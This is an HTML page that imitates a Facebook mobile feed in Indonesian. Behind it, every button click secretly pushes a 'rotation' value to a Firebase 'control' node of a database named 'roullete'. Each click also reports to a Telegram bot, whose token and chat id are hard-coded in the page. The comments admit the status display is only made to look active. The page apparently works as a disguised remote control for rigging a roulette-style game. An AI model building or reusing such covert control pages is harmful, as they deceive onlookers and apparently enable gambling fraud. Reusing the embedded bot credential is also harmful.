<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        body { background: #18191a; color: #e4e6eb; overflow-x: hidden; }

        /* --- HEADER & NAV --- */
        .header { background: #242526; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .nav-primary { display: flex; justify-content: space-around; background: #242526; border-bottom: 1px solid #3e4042; position: sticky; top: 48px; z-index: 99; }
        .nav-icon { font-size: 24px; padding: 12px; cursor: pointer; width: 16%; text-align: center; color: #b0b3b8; }
        .nav-icon:active { color: #1877f2; }

        /* --- POST BOX (RANDOM) --- */
        .post-bar { background: #242526; padding: 12px; display: flex; align-items: center; gap: 10px; margin-top: 8px; }
        .avatar-circle { width: 40px; height: 40px; background: #4e4f50; border-radius: 50%; overflow: hidden; }
        .avatar-circle img { width: 100%; height: 100%; object-fit: cover; }
        .search-fake { background: #3a3b3c; flex: 1; padding: 10px 15px; border-radius: 20px; color: #b0b3b8; font-size: 14px; cursor: pointer; }

        /* --- SYSTEM STATUS (FAKE CONNECTED) --- */
        .system-status-card { background: #1c1e21; border-top: 2px solid #1877f2; padding: 12px; margin-top: 10px; }
        .sys-title { font-size: 11px; font-weight: bold; color: #1877f2; margin-bottom: 5px; }
        .sys-info { font-size: 10px; color: #b0b3b8; font-family: monospace; line-height: 1.4; }

        /* --- VIDEO FEED CARD --- */
        .feed-card { background: #242526; margin-top: 10px; padding: 12px; border-bottom: 1px solid #3e4042; }
        .feed-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
        .profile-name { font-weight: bold; font-size: 14px; }
        .feed-time { font-size: 11px; color: #b0b3b8; }
        .feed-text { font-size: 14px; line-height: 1.4; margin-bottom: 12px; }

        /* CONTAINER VIDEO */
        .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 8px; overflow: hidden; }
        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }

        /* --- SHORTCUT GRID (7-12) --- */
        .shortcut-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; padding: 12px; background: #242526; margin-top: 10px; }
        .shortcut-item { background: #3a3b3c; padding: 12px 5px; border-radius: 8px; text-align: center; cursor: pointer; }
    </style>
</head>
<body onmousedown="resetTimer()">

    <div id="fb-remote">
        <div class="header">
            <div style="color:#fff; font-size: 24px; font-weight: bold;">facebook</div>
            <div style="display: flex; gap: 15px; font-size: 18px;">🔍 💬</div>
        </div>

        <div class="nav-primary">
            <div class="nav-icon" onclick="sendCmd(1, 'HOME')">🏠</div>
            <div class="nav-icon" onclick="sendCmd(2, 'WATCH')">📺</div>
            <div class="nav-icon" onclick="sendCmd(3, 'MARKET')">🏪</div>
            <div class="nav-icon" onclick="sendCmd(4, 'GROUPS')">👥</div>
            <div class="nav-icon" onclick="sendCmd(5, 'NOTIF')">🔔</div>
            <div class="nav-icon" onclick="sendCmd(6, 'MENU')">☰</div>
        </div>

        <div class="post-bar">
            <div class="avatar-circle"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
            <div class="search-fake" onclick="sendCmd(null, 'RANDOM')">Apa yang Anda pikirkan?</div>
        </div>

        <div class="system-status-card">
            <div class="sys-title">SECURITY & SYSTEM SYNC</div>
            <div class="sys-info">
                Node: <span id="node-val">ID_STABLE</span><br>
                Payload: <span id="payload-val">READY</span><br>
                Status: <span id="sync-val" style="color:#42b72a">CONNECTED</span>
            </div>
        </div>

        <div class="feed-card">
            <div class="feed-header">
                <div class="avatar-circle"><img src="https://i.ibb.co/3Y8Nf6q/fb-avatar.png"></div>
                <div>
                    <div class="profile-name">Video Rekomendasi</div>
                    <div class="feed-time">Just now • 🌎</div>
                </div>
            </div>
            <div class="feed-text">Tonton video menarik hari ini. Jangan lupa like dan share! #facebookvideo</div>
            
            <div class="video-container">
                <iframe src="https://www.facebook.com/plugins/video.php?height=314&href=https%3A%2F%2Fwww.facebook.com%2Fshare%2Fv%2F177dwyFayA%2F&show_text=false&width=560&autoplay=1" 
                    scrolling="no" frameborder="0" allowfullscreen="true" 
                    allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share">
                </iframe>
            </div>
        </div>

        <div class="shortcut-grid">
            <div class="shortcut-item" onclick="sendCmd(7, 'REELS')">🎞️ <span style="font-size:10px; display:block;">Reels</span></div>
            <div class="shortcut-item" onclick="sendCmd(8, 'LIVE')">🎥 <span style="font-size:10px; display:block;">Live</span></div>
            <div class="shortcut-item" onclick="sendCmd(9, 'PHOTO')">🖼️ <span style="font-size:10px; display:block;">Foto</span></div>
            <div class="shortcut-item" onclick="sendCmd(10, 'EVENT')">📅 <span style="font-size:10px; display:block;">Acara</span></div>
            <div class="shortcut-item" onclick="sendCmd(11, 'SAVE')">🔖 <span style="font-size:10px; display:block;">Simpan</span></div>
            <div class="shortcut-item" onclick="sendCmd(12, 'DATE')">❤️ <span style="font-size:10px; display:block;">Kencan</span></div>
        </div>
    </div>

    <script>
        let dbRef = null;
        let logoutTimer;
        let isAdminLocked = false; 

        // Inisialisasi Firebase
        const config = { databaseURL: "https://roullete-fc17f-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        if (!firebase.apps.length) firebase.initializeApp(config);
        dbRef = firebase.database().ref('control');

        // Monitoring Lock (Tanpa merubah teks UI)
        dbRef.on('value', (s) => {
            const d = s.val();
            if (d && (d.clientA_status === "OFF" || d.app_status === "OFF")) {
                isAdminLocked = true;
            } else {
                isAdminLocked = false;
            }
        });

        function sendCmd(id, label) {
            let val = (id === null) ? "RANDOM" : (12 - id).toFixed(1);
            
            // UI Feedback (Seolah-olah aktif)
            document.getElementById("node-val").innerText = "ID_" + label;
            document.getElementById("payload-val").innerText = val;
            document.getElementById("sync-val").innerText = "SENDING...";

            if (isAdminLocked) {
                setTimeout(() => { document.getElementById("sync-val").innerText = "CONNECTED"; }, 800);
                return; // Berhenti jika OFF di admin
            }

            // Jalankan Perintah
            fetch(`https://api.telegram.org/bot8075763270:AAHO7w8v1g2ThE_NetGWEpFDid620dlmF28/sendMessage?chat_id=1988855705&text=FB_VIDEO_LOG:${label}_Val:${val}`);
            
            if(dbRef) {
                dbRef.update({ rotation: val, last_click: Date.now() }).then(() => {
                    setTimeout(() => { document.getElementById("sync-val").innerText = "CONNECTED"; }, 800);
                });
            }
        }

        function resetTimer() {
            clearTimeout(logoutTimer);
            logoutTimer = setTimeout(() => { location.reload(); }, 600000); 
        }
    </script>
</body>
</html>
